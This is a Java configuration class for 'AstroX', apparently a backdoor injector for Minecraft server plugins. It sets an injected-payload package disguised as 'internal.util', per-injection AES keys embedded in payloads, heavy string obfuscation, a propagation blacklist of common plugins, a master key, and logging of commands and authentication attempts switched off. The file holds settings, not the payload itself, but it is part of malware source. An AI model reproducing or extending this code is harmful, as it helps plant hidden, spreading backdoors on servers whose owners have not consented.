package dev.naruto.astrox;

import dev.naruto.astrox.obfuscation.StringEncryptor;

import javax.crypto.SecretKey;
import java.security.SecureRandom;

/**
 * Compile-time and runtime configuration for AstroX.
 * The master key is no longer hardcoded — it must be provided via CLI {@code --key}.
 */
public class Config {
    // Core settings
    public static final String COMMAND_PREFIX = "#";
    public static final String PAYLOAD_PACKAGE_SUFFIX = "internal.util";

    // Master key — set at runtime via CLI, never hardcoded
    private static volatile String masterKey = null;

    // Encryption — AES-256-GCM key generated per injection
    private static volatile StringEncryptor encryptor = new StringEncryptor();

    // Obfuscation
    public static final boolean ENABLE_OBFUSCATION = true;
    public static final int OBFUSCATION_LEVEL = 8;
    public static final boolean ENCRYPT_STRINGS = true;

    // Legacy XOR key (kept for backward compat with existing payloads)
    public static final byte[] XOR_KEY = generateRandomXorKey();

    // Debug
    public static final boolean DEBUG_MODE = false;
    public static final boolean VERBOSE_LOGGING = false;
    public static final boolean LOG_AUTH_ATTEMPTS = false;
    public static final boolean LOG_COMMANDS = false;

    // Advanced
    public static final boolean USE_DYNAMIC_LOADER = true;
    public static final boolean AUTO_DEAUTH_ON_QUIT = false;
    public static final int MAX_AUTHORIZED_USERS = 0;

    // Propagation settings
    public static final String[] PROPAGATION_BLACKLIST = {
            "protocollib",
            "viaversion",
            "geyser"
    };

    // ==================== Master Key Management ====================

    /**
     * Set the master key (called from CLI argument parsing).
     *
     * @param key the master key string
     * @throws IllegalArgumentException if key is null or empty
     */
    public static void setMasterKey(String key) {
        if (key == null || key.isBlank()) {
            throw new IllegalArgumentException("Master key cannot be null or empty");
        }
        masterKey = key;
    }

    /**
     * Get the master key. Throws if not yet set.
     *
     * @return the master key
     * @throws IllegalStateException if master key has not been set via --key flag
     */
    public static String getMasterKey() {
        if (masterKey == null) {
            throw new IllegalStateException(
                    "Master key not configured. Use --key <key> flag to set the master key.");
        }
        return masterKey;
    }

    /**
     * Check if master key has been configured.
     */
    public static boolean hasMasterKey() {
        return masterKey != null;
    }

    // ==================== Encryption Key Management ====================

    /**
     * Get the current AES-256-GCM encryptor instance.
     */
    public static StringEncryptor getEncryptor() {
        return encryptor;
    }

    /**
     * Get the AES key as a hex string for embedding in payloads.
     */
    public static String getEncryptionKeyHex() {
        return encryptor.getKeyHex();
    }

    /**
     * Get the AES SecretKey object.
     */
    public static SecretKey getEncryptionKey() {
        return encryptor.getKey();
    }

    /**
     * Regenerate the encryption key (new key per injection).
     */
    public static void regenerateEncryptionKey() {
        encryptor = new StringEncryptor();
    }

    // ==================== Legacy XOR Key ====================

    private static byte[] generateRandomXorKey() {
        byte[] key = new byte[16];
        new SecureRandom().nextBytes(key);
        return key;
    }

    /**
     * Get the legacy XOR key as a hex string.
     */
    public static String getXorKeyHex() {
        StringBuilder sb = new StringBuilder();
        for (byte b : XOR_KEY) {
            sb.append(String.format("%02X ", b));
        }
        return sb.toString().trim();
    }
}
